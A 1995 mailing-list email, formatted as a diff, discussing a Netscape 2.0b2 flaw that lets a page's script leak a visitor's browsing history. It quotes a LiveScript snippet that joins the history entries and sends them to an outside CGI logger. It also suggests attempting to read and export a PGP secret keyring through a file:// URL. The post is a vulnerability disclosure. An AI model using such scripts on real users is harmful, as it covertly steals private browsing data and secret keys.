@@ -1,0 +1,61 @@
+From: Adam Shostack <adam@lighthouse.homeport.org>
+Date: Fri, 1 Dec 1995 14:20:08 +0800
+To: graeme@chem2.chem.swin.edu.au (Graeme Cross)
+Subject: Re: Netscape 2.0b2 allows for invasion of privacy (fwd)
+In-Reply-To: <Pine.SGI.3.90.951201155131.15809A-100000@chem2.chem.swin.edu.au>
+Message-ID: <199512010605.BAA18775@homeport.org>
+MIME-Version: 1.0
+Content-Type: text
+
+
+	About a month ago, I made the argument that Java, despite its
+imperfections, is much better than most things we'll see.  I stand by
+this argument, and urge Netscape to use only Java* as a scripting
+language.
+
+	*By Java, I mean the class of languages designed with security
+in mind.  I think that means Java and Safe-TCL.  Taint-perl is not
+useful; its designed for unsafe input from a user, not unsafe code.
+
+	People with time to hack netscape might experiment with
+location.href = "file://.pgp/secring.pgp" and see if you can write a
+script to export it somewhere.
+
+And here's how its done.  Hitting the page makes your history public
+knowledge.  (Btw, Bal, is Netbsd1.1 stable yet? :)
+
+scott@tripleg.com.au wrote this code:
+
+<SCRIPT LANGUAGE="LiveScript">
+
+<!--
+  i = 0
+  yourHistory = ""
+  while (i < history.length) { 
+    yourHistory += history[i]
+    i++;
+    if (i < history.length) yourHistory += "^"
+  }
+  location.href = "http://www.tripleg.com.au/cgi-bin/scott/his?"+yourHistory
+<!-- hahah here is the hidden script -->
+
+
+Graeme Cross wrote:
+| >From: Scott Weston <scott@tripleg.com.au>
+| >The "LiveScript" that I wrote extracts ALL the history of the current
+| >netscape window.  By history I mean ALL the pages that you have visited
+| >to get to my page, it then generates a string of these and forces the
+| >Netscape client to load a URL that is a CGI script with the QUERY_STRING
+| >set to the users History.  The CGI script then adds this information
+| >to a log file.  Now if this hasn't quite CLICKED yet lets do a little
+| >example.
+
+
+-- 
+"It is seldom that liberty of any kind is lost all at once."
+					               -Hume
+
+
+
+
+
